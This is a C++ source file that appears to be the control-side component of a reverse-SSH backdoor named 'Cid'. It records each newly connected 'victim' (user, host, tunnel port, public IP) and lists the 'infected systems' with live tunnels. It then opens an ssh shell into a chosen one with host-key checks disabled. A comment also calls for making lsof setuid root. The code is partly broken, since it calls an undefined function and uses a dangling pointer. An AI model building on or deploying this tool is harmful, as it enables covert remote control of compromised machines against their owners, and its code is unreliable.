#include <stdio.h>
#ifndef _WIN32
#include <unistd.h>
#endif
#include <stdlib.h>
#include <string.h>

#include <vector>
#include <fstream>
#include <iomanip>
#include <vector>
#include <time.h>
#include <iostream>
#include <sstream>      // std::istringstream
#include <algorithm>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <iostream>


#ifdef _WIN32
#define popen _popen
#define pclose _pclose
#endif

#include "VariadicTable.h"
extern "C" {
#include "sshpass.h"
}


using namespace std;

#define LOG_PATH "/tmp/cid-ssh.log"
#define DELIMETER '$'
#define TIME_FORMAT "%Y/%m/%d-%T"

vector<string> split(const string& s, char delim) {
    vector<string> result;
    stringstream ss(s);
    string item;

    while (getline(ss, item, delim)) {
        result.push_back(item);
    }

    return result;
}

void print_table(std::vector<std::tuple<tm, std::string, std::string, unsigned int, std::string, bool>> log_vector) {
    VariadicTable<unsigned int, std::string, std::string, std::string, unsigned int, std::string, std::string> vt({ "#", "Timestamp", "Username", "Hostname", "Port", "Public IP", "Active" });

    unsigned int index = 1;
    for (auto& entry : log_vector) {
        std::stringstream ss;
        ss << std::put_time(&std::get<0>(entry), "%c");
        std::string timestamp_string = ss.str();

        vt.addRow({ index, timestamp_string, std::get<1>(entry), std::get<2>(entry), std::get<3>(entry), std::get<4>(entry), std::get<5>(entry) ? "Yes" : "No" });
        index++;
    }

    vt.print(std::cout);
}

void get_timestamp(char* ts) {
    time_t rawtime;
    struct tm* timeinfo;

    time(&rawtime);
    timeinfo = localtime(&rawtime);

    strftime(ts, 300, TIME_FORMAT, timeinfo);
}


const char* get_process_name_by_pid(const int pid)
{
    char* name = (char*)calloc(1024, sizeof(char));
    if (name) {
        sprintf(name, "/proc/%d/cmdline", pid);
        FILE* f = fopen(name, "r");
        if (f) {
            size_t size;
            size = fread(name, sizeof(char), 1024, f);
            if (size > 0) {
                if ('\n' == name[size - 1])
                    name[size - 1] = '\0';
            }
            fclose(f);
        }
    }
    return name;
}

void log(const char* text) {
    char ts[301] = { 0 };
    get_timestamp(ts);

    FILE* f = fopen(LOG_PATH, "a");

    if (f == NULL) {
        printf("Error opening %s\n", LOG_PATH);
        perror("The following error occurred");
        return;
    }

    fprintf(f, "[LOG] %s - %s\n", ts, text);
    fclose(f);

}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}



bool compareByTime(std::tuple<tm, std::string, std::string, unsigned int, std::string, bool> item1, std::tuple<tm, std::string, std::string, unsigned int, std::string, bool> item2)
{
    time_t t1 = mktime(&std::get<0>(item1));
    time_t t2 = mktime(&std::get<0>(item2));

    return difftime(t1, t2) > 0 ? true : false;
}


std::vector<std::tuple<tm, std::string, std::string, unsigned int, std::string, bool>> clean_repeated(std::vector<std::tuple<tm, std::string, std::string, unsigned int, std::string, bool>> log_vector) {
    std::vector<std::tuple<tm, std::string, std::string, unsigned int, std::string, bool>> unique_log_vector;
    for (auto item : log_vector) {
        auto hostname = std::get<2>(item);
        bool exist = false;
        for (auto item2 : unique_log_vector) {
            auto hostname2 = std::get<2>(item2);
            if (hostname == hostname2) {
                exist = true;
            }
        }
        if (!exist) {
            unique_log_vector.push_back(item);
        }
    }
    return unique_log_vector;
}

std::string get_public_IP(std::string local_binded_port) {
    char cmd_get_public_ip[250] = { 0 };
    const char* format = "lsof -Pan -i tcp -c sshd -sTCP:LISTEN -u^root | grep 127.0.0.1:%s | tr -s ' ' | cut -d ' ' -f2 | xargs -I{} lsof -Pan -i tcp -c sshd -sTCP:ESTABLISHED -u^root -p {} | grep -v COMMAND | cut -d \">\" -f2 |cut -d \":\" -f1";

    snprintf(cmd_get_public_ip, sizeof(cmd_get_public_ip), format, local_binded_port.c_str());

    return exec(cmd_get_public_ip);
}

inline bool isInteger(const std::string& s)
{
    if (s.empty() || ((!isdigit(s[0])) && (s[0] != '-') && (s[0] != '+'))) return false;

    char* p;
    strtol(s.c_str(), &p, 10);

    return (*p == 0);
}

int log_new_victim(int argc, char** argv) {
    // need to run chmod +s /usr/bin/lsof as root first
    // called by Cid
  //  log("log_new_victim");
    printf("called by sshd\n");
    
    // sshd is executing -c "command" so argc should be 3
    if (argc != 3) {
        char tmp[100] = { 0 };
        snprintf(tmp, sizeof tmp, "Got a different number of arguments than expected (3) got %d\n", argc);
        log(tmp);
        return 1;
    }
    printf("called by sshd\n");
    FILE* f = fopen(LOG_PATH, "a");
    if (f == NULL) {
        printf("Error opening %s\n", LOG_PATH);
        perror("The following error occurred");
        return 1;
    }
  
    char ts[301] = { 0 };
    get_timestamp(ts);
    vector<string> v = split(argv[2], DELIMETER);

    if (v.size() != 3) {
        char tmp[500] = { 0 };
        snprintf(tmp, sizeof tmp, "Some error happened spliting %s\n", argv[2]);
        log(tmp);
        fclose(f);
        return 1;
    }
    else if (argc == 3) {
        std::string username = v[0];
        std::string hostname = v[1];
        std::string port = v[2];

        // Security check since port will be passed as argument to lsof
        if (!isInteger(port) || std::stoi(port) > 65535) {
            printf("Port is not an integuer\n");
            log("port not integuer");
            return 1;
        }

        std::string public_IP = get_public_IP(port);
        // Check if we got the correct IP
        if (!public_IP.empty()){
            public_IP.erase(std::remove(public_IP.begin(), public_IP.end(), '\n'), public_IP.end());
        }
        else {
            // We could not get the correct public IP. Let's set it to UNKNOWN
            public_IP = "UNKNOWN";
        }

        fprintf(f, "%s %s %s %s %s\n", ts, username.c_str(), hostname.c_str(), port.c_str(), public_IP.c_str());
    }
    fclose(f);

    return 0;
}

void print_banner() {
    printf("This is the banner. It will be better...\n");
}


/* This function will iterate over the log_vector list and check which entries
    have active connections
    Output example:

    sshd 1366 anonymous 3u IPv4 16506497 0t0 TCP 10.142.0.21:22->73.70.237.157:52674 (ESTABLISHED)
    sshd 1366 anonymous 8u IPv4 16506544 0t0 TCP 127.0.0.1:1234 (LISTEN)
    sshd 31647 alberto.garcia 3u IPv4 16489336 0t0 TCP 10.142.0.21:22->35.236.4.191:54714 (ESTABLISHED)
*/
std::vector<std::tuple<tm, std::string, std::string, unsigned int, std::string, bool>> check_active_connections(std::vector<std::tuple<tm, std::string, std::string, unsigned int, std::string, bool>> log_vector) {
    auto cmd_result = exec("lsof -Pan -i tcp -c sshd -u^root | grep -v COMMAND | tr -s ' '");

    for (unsigned int i = 0; i < log_vector.size(); i++) {
        char to_search[30] = { 0 };
        const char* format = " 127.0.0.1:%d (LISTEN)";

        auto port = std::get<3>(log_vector[i]);
        auto public_IP = std::get<4>(log_vector[i]);

        snprintf(to_search, sizeof(to_search), format, port);

        for (auto& line : split(cmd_result, '\n')) {
            if (line.find(to_search) != std::string::npos) {
                // get the pid (1366 in the example) that no we need to find in the line that says (ESTABLISHED)
                auto pid = split(line, ' ')[1];
                for (auto& line2 : split(cmd_result, '\n')) {
                    if (line2.find("(ESTABLISHED)") != std::string::npos && split(line2, ' ')[1] == pid) {
                        auto lsof_public_IP = split(split(line2, '>')[1], ':')[0];

                        // Now that we got the public IP we compare it with the one we had
                        if (public_IP == lsof_public_IP) {
                            // We got a match. Let's set that entry as Active and move to next iteration
                            std::get<5>(log_vector[i]) = true;
                            goto next_iteration;
                        }
                    }
                }
            }
        }
    next_iteration:
        continue;
    }

    return log_vector;
}


int exec_ssh(std::string port)
{
    std::string com1 = "ssh localhost -o LogLevel=ERROR -o StrictHostKeyChecking=no -o GlobalKnownHostsFile=/dev/null -o UserKnownHostsFile=/dev/null -p ";
    std::string com3(" 2>&1");

    std::string cmd_final = com1 + port + com3;

    std::array<char, 128> buffer;
    std::string result;

    std::cout << "Opening reading pipe" << std::endl;
    FILE* pipe = popen(cmd_final.c_str(), "r");
    if (!pipe)
    {
        std::cerr << "Couldn't start command." << std::endl;
        return 0;
    }
    while (fgets(buffer.data(), 128, pipe) != NULL) {
        //std::cout << "Reading..." << std::endl;
        result += buffer.data();
    }
    auto returnCode = pclose(pipe);

    std::cout << result << std::endl;
    std::cout << returnCode << std::endl;

    return 0;
}

int show_existent_victims() {
    print_banner();
    std::ifstream infile(LOG_PATH);
    std::vector<std::tuple<tm, std::string, std::string, unsigned int, std::string, bool>> log_vector;
    
    unsigned int port;
    tm ts = { 0 };

    std::string line;
    while (std::getline(infile, line))
    {
        std::istringstream iss(line);
        std::string date, username1, hostname, public_IP;
        if (!(iss >> date >> username1 >> hostname >> port >> public_IP)) {
            continue; //can't parse this line 
        } 
        // parsing went fine. Last step parse time
        std::istringstream parsed_date(date);
        parsed_date >> std::get_time(&ts, TIME_FORMAT);
        if (parsed_date.fail()) {
            std::cout << "Parse failed\n";
            continue;
        }
        else {
            // std::cout << std::put_time(&ts, "%c") << '\n';
        }
        log_vector.push_back(std::make_tuple(ts, username1, hostname, port, public_IP, false));
    }

    //while (infile >> date >> username1 >> hostname >> port >> public_IP)
    //{
    //    std::istringstream ss(date);
    //    ss >> std::get_time(&ts, TIME_FORMAT);
    //    if (ss.fail()) {
    //        std::cout << "Parse failed\n";
    //        continue;
    //    }
    //    else {
    //        // std::cout << std::put_time(&ts, "%c") << '\n';
    //    }
    //    log_vector.push_back(std::make_tuple(ts, username1, hostname, port, public_IP, false));
    //}

    // sort descendent by time
    std::sort(log_vector.begin(), log_vector.end(), compareByTime);

    // remove old entries for same hostname
    log_vector = clean_repeated(log_vector);

    log_vector = check_active_connections(log_vector);


    print_table(log_vector);

    std::cout << "Interact with any infected system? Enter # of system or enter to skip\n> ";
    std::string selection;
    std::getline(std::cin, selection);

    if (selection.empty()) {
        return 0;
    }
   
    if (isInteger(selection) &&
        std::stoi(selection) <= log_vector.size() &&
        std::get<5>(log_vector[std::stoi(selection) - 1]) == true /*check if connection is active*/
        ) 
    {

        auto port_ptr = std::to_string(std::get<3>(log_vector[std::stoi(selection) - 1])).c_str();
        
        run_ssh_port(port_ptr);
    }
    else {
        std::cout << "That # is invalid or the session is not active\n";
    }


    return 0;
}

int main(int argc, char** argv) {
#ifndef _WIN32
    pid_t ppid = getppid();
#else
    const int ppid = 1;
#endif
    const char* parent_name = get_process_name_by_pid(ppid);
    char* coso =  "default$DESKTOP-Q4FDM2G$1234";
    //    log("at main");
    //printf("pid is %d %s\n", ppid, parent_name);

    if (strncmp(parent_name, "sshd", 4) == 0) {
        //alog_new_victim(2, &coso);
        log_new_victim(argc, argv);
    }

    else {
        show_existent_victims();
    }

    return 0;
}